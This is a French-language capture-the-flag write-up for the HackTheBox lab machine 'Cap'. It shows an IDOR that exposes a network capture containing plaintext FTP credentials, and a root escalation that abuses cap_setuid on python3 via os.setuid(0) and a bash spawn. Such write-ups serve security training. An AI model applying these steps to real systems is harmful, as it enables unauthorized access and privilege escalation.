---
title: HTB | Cap
description: Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root.
slug: cap-htb
date: 2024-12-06 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Cap cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Cap</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.245</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Users
```bash
nathan : Buck3tH4TF0RM3!
```

## Enumeration

### nmap
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -An -p- 10.10.10.245
Port 80 : HTTP - http://cap.htb
```

### /etc/hosts
On ajoute les noms de domaines necessaire. Un peu plus tard on découvrira qu'il y a également le nom de domaine: **data.analytical.htb**
```bash
## ...
10.10.10.245    cap.htb
```

## Foothold

### Snapshot
On observe un bouton snapshot qui permet visualiser des fichiers de capture reseau .pcap. On observe l'url :
> http://cap.htb/data/3
On peut download via un bouton, sur Burp on observe un appel a l'url:
> http://cap.htb/download/3

On download le plus de pcap possible pour les observer, on peut voir que le numéro 0 est intéressant.
Dedans, on découvre la capture de packets réseau montrant une connexion ftp avec un user/password en clair:

```bash
220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
```

### FTP - user flag
On se connecte avec le user nathan et on récupère le flag utilisateur
```bash
ftp cap.htb
Connected to cap.htb.
220 (vsFTPd 3.0.3)
Name (cap.htb:leopold): nathan
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||41519|)
150 Here comes the directory listing.
-rwxrwxr-x    1 1001     1001        46631 Dec 06 17:17 linenum.sh
-r--------    1 1001     1001           33 Dec 06 13:10 user.txt
226 Directory send OK.
ftp> cat user.txt
?Invalid command.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||44318|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |***************************************************************************************************************************************************************|    33      608.04 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.17 KiB/s)
```

## Privilege Escalation

### LinPEAS : Python SUID -> cap_setuid
On peut se connecter en ssh avec l'utilisateur nathan sur la machine. Ensuite, on trouve une vulnérabilité.
Python est autorisé à changer setuid(0) et donc d'executer n'importe quelle commande en tant que root:
```bash
$ ./linpeas.sh
...
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
...

nathan@cap:~/a$ vim please_dont_do_this.py

import os

## Changer l'UID en root
os.setuid(0)

## Lancer un shell interactif avec les privilèges root
os.system("/bin/bash")

nathan@cap:~/a$ python3 please_dont_do_this.py 
root@cap:~/a# 
root@cap:~/a# whoami
root
root@cap:~# cd /root
root@cap:/root# cat root.txt
d5d1.....bcf0
```